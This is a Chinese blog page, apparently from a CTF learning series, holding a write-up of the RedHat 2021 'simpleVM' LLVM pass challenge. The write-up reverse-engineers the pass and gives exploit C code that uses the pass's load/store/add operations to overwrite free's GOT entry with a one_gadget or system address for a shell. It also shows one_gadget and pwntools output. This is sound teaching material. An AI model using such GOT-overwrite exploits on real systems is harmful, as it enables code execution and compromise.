<p>本题的漏洞点在于代码执行。在做题的时候，要特别注意动态代码执行部分，这个部分往往就是漏洞产生的地方。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/LLVM-pass-pwn-%E5%85%A5%E9%97%A8-3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/LLVM-pass-pwn-%E5%85%A5%E9%97%A8-3/" class="post-title-link" itemprop="url">LLVM pass pwn 入门 (3)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:37:20" itemprop="dateCreated datePublished" datetime="2023-02-28T22:37:20+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-01 11:30:50" itemprop="dateModified" datetime="2023-03-01T11:30:50+08:00">2023-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/llvm-pass-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">llvm pass pwn 系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>7.6k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>7 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>这篇文章中我们来分析一下红帽杯2021-simpleVM这道题，由于和上一道题相比这道题相对更加简单些，读者可以在阅读本文之前实操一下，遇到困难时再通过本文找到答案，这样能够更好地提升我们的做题实践能力。（本题的附件可以在Github上找到，在笔者的Github中也有保存）</p>
<h1 id="redhat2021-simplevm"><a class="markdownIt-Anchor" href="#redhat2021-simplevm"></a> RedHat2021-simpleVM</h1>
<p>首先还是使用IDA打开，找到了几个没有名字的函数：</p>
<p><img src="1.png" alt="" /></p>
<h2 id="step-1-找到runonfunction函数"><a class="markdownIt-Anchor" href="#step-1-找到runonfunction函数"></a> Step 1: 找到runOnFunction函数</h2>
<p>如果读者还记得上一篇文章的方法，这一步应该来说不难想到。我们是通过IDA汇编界面中对函数的交叉引用情况进行判断的，如果这个函数没有数据段的交叉引用，那么它一定不是runOnFunction函数，因为这是一个覆写的函数，其地址会被保存到vtable结构体中。根据这种方法，我们可以找到多个函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0000000000006780 sub_6780        proc near               ; CODE XREF: sub_67D0+24↓p</span><br><span class="line">LOAD:0000000000006780                                         ; DATA XREF: LOAD:off_20DD20↓o</span><br><span class="line">...</span><br><span class="line">LOAD:00000000000067D0 sub_67D0        proc near               ; DATA XREF: LOAD:000000000020DD28↓o</span><br><span class="line">...</span><br><span class="line">LOAD:0000000000006830 sub_6830        proc near               ; DATA XREF: LOAD:000000000020DDA8↓o</span><br></pre></td></tr></table></figure>
<p><img src="2.png" alt="" /><br />
<img src="3.png" alt="" /><br />
其中我们打开前两个函数，发现都是一些删除和调用析构函数的操作，因此这一定不是runOnFunction函数的覆写。故runOnFunction应该是sub_6830函数。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">runOnFunction</span><span class="params">(__int64 a1, llvm::Value *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">bool</span> v4; <span class="comment">// [rsp+7h] [rbp-119h]</span></span><br><span class="line">  <span class="type">size_t</span> v5; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> *Name; <span class="comment">// [rsp+28h] [rbp-F8h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+30h] [rbp-F0h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+94h] [rbp-8Ch]</span></span><br><span class="line"></span><br><span class="line">  Name = (<span class="type">const</span> <span class="type">void</span> *)llvm::Value::<span class="built_in">getName</span>(a2);</span><br><span class="line">  v7 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="string">&quot;o0o0o0o0&quot;</span> )</span><br><span class="line">    v5 = <span class="built_in">strlen</span>(<span class="string">&quot;o0o0o0o0&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v5 = <span class="number">0LL</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v7 == v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">      v8 = <span class="built_in">memcmp</span>(Name, <span class="string">&quot;o0o0o0o0&quot;</span>, v5);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v8 = <span class="number">0</span>;</span><br><span class="line">    v4 = v8 == <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    <span class="built_in">sub_6AC0</span>(a1, a2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="step-2-分析runonfunction函数"><a class="markdownIt-Anchor" href="#step-2-分析runonfunction函数"></a> Step 2: 分析runOnFunction函数</h2>
<p>上面的代码就是反汇编出来的runOnFunction函数，和上一篇文章国赛题眼花缭乱的代码段相比，还是友好了不少的，代码的逻辑清晰可见。</p>
<p>首先使用了getName函数获取了Value对象的名字，这里其遍历的是函数名，笔者分享一种看代码的方法：从后往前，执果索因。我们可以看到最后三行是如果v4不等于0就执行sub_6AC0函数，否则就返回。在runOnFunction函数中我们没有发现任何有关于内存空间改动的函数，只有一个strlen和memcmp函数用于进行内存操作，但这两个函数都并不会对内存中对应地址的值产生任何变化。因此漏洞点一定不在runOnFunction函数，需要执行到sub_6A70函数。那也就意味着v4不能等于0。前面的代码中，唯一能让v4可能不等于0的语句就是<code>v4=v8==0</code>。注意这条语句的意思是如果<code>v8==0</code>那么v4=1。看一下汇编代码就可以知道：<br />
<img src="4.png" alt="" /><br />
这里使用了一个setz指令，它的含义是当标志寄存器中的ZF位为1时，将al的值设为1。因此，我们需要让<code>v8==0</code>才行。不难发现，<code>v8==0</code>的条件就是函数名等于&quot;o0o0o0o0&quot;。因此这个LLVM pass只会对名为&quot;o0o0o0o0&quot;的函数进行一些操作。我们再来到sub_6A70函数看一下执行了什么操作。</p>
<h2 id="step-3-分析sub_6ac0函数"><a class="markdownIt-Anchor" href="#step-3-分析sub_6ac0函数"></a> Step 3: 分析sub_6AC0函数</h2>
<p>下面就是sub_6AC0函数的内容：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">sub_6AC0</span><span class="params">(__int64 a1, llvm::Function *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  llvm::BasicBlock *v3; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+38h] [rbp-18h] BYREF</span></span><br><span class="line">  __int64 v5[<span class="number">2</span>]; <span class="comment">// [rsp+40h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v5[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v5[<span class="number">0</span>] = llvm::Function::<span class="built_in">begin</span>(a2);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = llvm::Function::<span class="built_in">end</span>(a2);</span><br><span class="line">    <span class="keyword">if</span> ( (llvm::<span class="keyword">operator</span>!=(v5, &amp;v4) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v3 = (llvm::BasicBlock *)llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::<span class="keyword">operator</span>*(v5);</span><br><span class="line">    <span class="built_in">sub_6B80</span>(a1, v3);</span><br><span class="line">    llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::<span class="keyword">operator</span>++(</span><br><span class="line">      v5,</span><br><span class="line">      <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的<code>llvm::Function::begin</code>和<code>llvm::Function::end</code>都是Function类的迭代器对象，其迭代的对象是函数中的基本块。因此这个循环的意思就是对每一个基本块执行sub_6B80函数。其中<code>v3 = (llvm::BasicBlock *)llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,false,false,void&gt;,false,false&gt;::operator*(v5);</code>这条语句中的<code>ilist</code>是LLVM标准库中定义的一个数据结构，与C++标准模板库list类似，但是LLVM中都是使用ilist来存储一个函数的所有基本块或指令，可以将其看成一个列表，针对于LLVM做了一些特殊的优化。那么v3也就是函数中的每一个基本块。我们需要进入sub_6B80函数看一下对这些基本块又进行了什么操作。</p>
<h2 id="step-4-分析sub_6b80函数"><a class="markdownIt-Anchor" href="#step-4-分析sub_6b80函数"></a> Step 4: 分析sub_6B80函数</h2>
<p>这个函数是主要操作，比较长，我们一点点来看。</p>
<h3 id="segment-1"><a class="markdownIt-Anchor" href="#segment-1"></a> Segment 1</h3>
<p><img src="5.png" alt="" /><br />
这一段中可以看到，使用了一个大循环，是对基本块进行遍历。这里的v36变量是从v39变量dyn_cast过来的，这是一个llvm定义的类型转换，不用去管。这里是将v36转换成了Instruction指令对象，然后获取了这个指令的指令码<code>getOpcode(v36)</code>。这个指令码的定义笔者找资料找了好久都没有找到，最终查看源码才发现其定义保存在<code>llvm/IR/Instruction.def</code>文件中，上面的代码意思是指令码需要为55才能进入下一步操作，否则就会直接跳过这个指令去处理下一条指令。我们看一下<code>llvm/IR/Instruction.def</code>文件中哪个指令的指令码是55：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HANDLE_OTHER_INST(55, Call, CallInst)</span><br></pre></td></tr></table></figure>
<p>即Call指令的指令码为55。如果查看上一篇文章中生成的.ll文件就可以发现，函数调用就是用Call指令来表示的。也即o0o0o0o0函数中的所有代码都要是函数调用，其他的代码写了也不会处理。</p>
<p>由此我们可以猜测出v35变量的CallBase指针类型实际上也就是函数调用的对象。源码中的注释说，<code>CallBase</code>对象是所有可以调用的指令的基类，这里“可以调用的指令”包含<code>InvokeInst</code>和<code>CallInst</code>。所有调用的指令都含有：调用的函数自身、零或若干个参数、<font color=blue>零或若干个操作数组以及零或若干个操作数输入 <strong>（原文是operand bundle，笔者不确定这里指的是不是数组的意思，如有错误还请读者指正）</strong></font></p>
<p>下面的<code>getCalledFunction</code>就是获取函数本身，将函数名拷贝到了变量s1中，下面判断函数名是否是pop，如果是判断<code>getNumOperands()</code>函数的结果是不是2。这里需要注意的是，<code>getNumOperands()</code>函数并不是返回函数参数的个数，而是返回一条指令中的变量个数。注意这里的v35变量类型是<strong>CallBase</strong>，是指令<strong>Instructions</strong>的子类，与CalledFunction变量的类型完全不同。随便截取一段.ll文件的代码可以看到call后面会跟上变量名，变量名之前加上@符号说明llvm将其认为是一个变量。因此在这里其实际返回的值应该是函数参数的个数+1。</p>
<p><img src="6.png" alt="" /></p>
<h3 id="segmant-2"><a class="markdownIt-Anchor" href="#segmant-2"></a> Segmant 2</h3>
<p>之后我们进入分析当函数名为pop时进行了何种处理。后面的一些变量笔者重命名了一下，读者可以自己打开IDA对照一下。</p>
<p><img src="7.png" alt="" /><br />
pop函数的参数个数应该是1。之后进入内部调用了<code>getArgOperand</code>函数，这个函数是用来返回被调用的函数的第一个<strong>实参</strong>的值，然后v31变量赋值为这个值，并以<code>ConstantInt</code>即整型常量的类型保存。如果这个值不为0，那么再次进行转换，<code>getZExtValue</code>这个函数我们在上一篇文章中见过类似的函数，通过函数名猜测其功能：get Zero Extended Value，即无符号扩展整数。其为1或2时v32变量指向两段内存的地址，这两段内存分别被命名为reg1和reg2。后面又将v3变量赋值为某段内存的二重指针（因为stackdoubleptr变量保存的是一个指针指向内存空间，因此这里表示其为二重指针）。那一段内存空间被命名为stack。hmmm，这样看起来程序中有一个小的vm，有虚拟出来的寄存器和栈，算是和vm题很像了。而且这里的操作也和汇编的pop指令完全相同，将栈顶的值赋值给reg1或reg2，然后栈指针下移8。因此这个vm中栈底在低地址，而栈顶在高地址，与汇编中的栈排列相反。</p>
<p>现在我们知道了这里可能是一个vm，那么分析后面的条件判断就会快上很多了。</p>
<h3 id="segment-3"><a class="markdownIt-Anchor" href="#segment-3"></a> Segment 3</h3>
<p><img src="8.png" alt="" /><br />
下面一个条件判断判断函数名是否是push，想都不用想这一定是入栈操作，将两个寄存器中的一个的值压入栈中，然后栈指针上移。</p>
<h3 id="segment-4"><a class="markdownIt-Anchor" href="#segment-4"></a> Segment 4</h3>
<p><img src="9.png" alt="" /><br />
当函数名为store时，注意最后的4行代码，出现了指针操作。其将一个寄存器看成指针，将这个地址保存的值拷贝到另外一个地址，这个地址就是另外一个寄存器指定的地址的地址（二重指针）。很明显这里我们可以将任意地址保存到这两个寄存器中。</p>
<h3 id="segment-5"><a class="markdownIt-Anchor" href="#segment-5"></a> Segment 5</h3>
<p><img src="10.png" alt="" /><br />
当函数名为load时，操作与store类似，但要注意拷贝的方向。store和load函数一定会是我们pwn的重点，至于具体应该如何去pwn，待下面进行调试时再去探索。</p>
<h3 id="segment-6"><a class="markdownIt-Anchor" href="#segment-6"></a> Segment 6</h3>
<p><img src="11.png" alt="" /><br />
add函数加法操作，有两个参数。第一个参数指定寄存器，第二个参数是要加到这个寄存器上的数值。这个函数对于我们的pwn也是有很大意义的。可以构造任意地址。</p>
<h3 id="segment-7"><a class="markdownIt-Anchor" href="#segment-7"></a> Segment 7</h3>
<p><img src="12.png" alt="" /><br />
min函数减法操作，有2个参数，第一个参数指定寄存器，第二个参数是要减去的数值。</p>
<p>至此，源码已经全部分析完毕。我们已经可以在exp中编写6个函数的原型了，注意参数的类型和个数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">o0o0o0o0</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">pop</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">store</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">load</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> reg1, <span class="type">int</span> reg2)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">min</span><span class="params">(<span class="type">int</span> reg1, <span class="type">int</span> reg2)</span>&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">o0o0o0o0</span><span class="params">()</span>&#123;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="step-5-编写expc同时进行调试"><a class="markdownIt-Anchor" href="#step-5-编写expc同时进行调试"></a> Step 5: 编写exp.c，同时进行调试</h2>
<p>现在，我们来着手编写exp，重点需要调试load和store这两个函数的执行。</p>
<p>一开始，reg1、reg2、stack中所有的值都为0，由于本题中opt-8程序没有开启PIE保护，因此其加载基址固定不变，我们可以利用这个获取到其got表中的地址，将其拷贝到reg或stack中。然后在此基础上计算出one_gadget的地址，将其写回到got表，即可执行one_gadget，逻辑很简单。</p>
<p>在这里，我们选择free函数作为地址覆盖的对象，找到opt程序中free函数got表的位置为0x77E100。因此o0o0o0o0函数的第一条语句应该是：<code>add(1, 0x77E100);</code>。然后使用load函数将got表中地址值保存到另一个寄存器中：<code>load(1);</code>。现在我们想要的地址在reg2中，加上相应的one_gadget偏移。与上一题相同，这里使用的是笔者虚拟机的libc而不是题目给的libc：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/Desktop/LLVM/challenges/RedHat2021-simpleVM# one_gadget /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [r12] == NULL || r12 == NULL</span><br><span class="line"></span><br><span class="line">0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br><span class="line"></span><br><span class="line">0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [rsi] == NULL || rsi == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br></pre></td></tr></table></figure>
<p>找到free函数偏移：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/Desktop/LLVM/challenges/RedHat2021-simpleVM# python3</span><br><span class="line">Python 3.8.10 (default, Jun 22 2022, 20:18:18) </span><br><span class="line">[GCC 9.4.0] on linux</span><br><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class="line">&gt;&gt;&gt; from pwn import *</span><br><span class="line">&gt;&gt;&gt; libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">[*] &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">&gt;&gt;&gt; print(hex(libc.symbols[&#x27;free&#x27;]))</span><br><span class="line">0x9a6d0</span><br><span class="line">&gt;&gt;&gt; </span><br></pre></td></tr></table></figure>
<p>因此，第三条语句应该是<code>add(2, 0x4942e);</code>，这样就得到了第一个one_gadget的地址。第四条语句将其写回到free.got中：<code>store(1);</code>，完成，我们连stack都没有用到。</p>
<p>exp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">o0o0o0o0</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">pop</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">store</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">load</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> reg, <span class="type">int</span> val)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">min</span><span class="params">(<span class="type">int</span> reg, <span class="type">int</span> val)</span>&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">o0o0o0o0</span><span class="params">()</span>&#123;</span><br><span class="line">	add(<span class="number">1</span>, <span class="number">0x77E100</span>);</span><br><span class="line">	load(<span class="number">1</span>);</span><br><span class="line">	add(<span class="number">2</span>, <span class="number">0x4942e</span>);</span><br><span class="line">	store(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>尝试运行，发现3个one_gadget都不行，应该是one_gadget的条件不满足。因此考虑写入system函数的地址，然后创建一个名为sh的函数，看看能不能执行到system(“sh”)。system函数的libc偏移为0x52290。</p>
<p>exp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">o0o0o0o0</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">pop</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">store</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">load</span><span class="params">(<span class="type">int</span> reg)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> reg, <span class="type">int</span> val)</span>&#123;&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">min</span><span class="params">(<span class="type">int</span> reg, <span class="type">int</span> val)</span>&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">o0o0o0o0</span><span class="params">()</span>&#123;</span><br><span class="line">	add(<span class="number">1</span>, <span class="number">0x77E100</span>);</span><br><span class="line">	load(<span class="number">1</span>);</span><br><span class="line">	add(<span class="number">2</span>, <span class="number">0x52290</span>);</span><br><span class="line">	store(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sh</span><span class="params">()</span>&#123;&#125;;</span><br></pre></td></tr></table></figure>
<p><img src="13.png" alt="" /><br />
可惜，还是不行。使用原来的libc应该是可以跑one_gadget的，因为有两个one_gadget的条件是栈中某处为0，相对来说更容易满足一些。笔者尝试通过追踪函数调用链获取到VMPass.so的加载基址，但发现VMPass.so的runOnFunction函数是通过call寄存器的方式调用的，目前尚无思路。不过这道题本身还是不难理解的，能够做到修改one_gadget就已经足够了。</p>
<p>下一篇文章笔者将会分析今年（2022）国赛题的satool，看一下和去年的同名题有什么区别。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/LLVM-pass-pwn-%E5%85%A5%E9%97%A8-2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/LLVM-pass-pwn-%E5%85%A5%E9%97%A8-2/" class="post-title-link" itemprop="url">LLVM pass pwn 入门 (2)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:36:53" itemprop="dateCreated datePublished" datetime="2023-02-28T22:36:53+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-01 11:30:45" itemprop="dateModified" datetime="2023-03-01T11:30:45+08:00">2023-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/llvm-pass-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">llvm pass pwn 系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>19k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>18 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>本文来分析几道题目，熟悉下LLVM pass pwn的解题流程。</p>
<h1 id="ciscn-2021-satool"><a class="markdownIt-Anchor" href="#ciscn-2021-satool"></a> CISCN-2021 satool</h1>
<p>国赛题，2022年也出了一道名字都一样的题，可见国赛还是很重视这类题型的。</p>
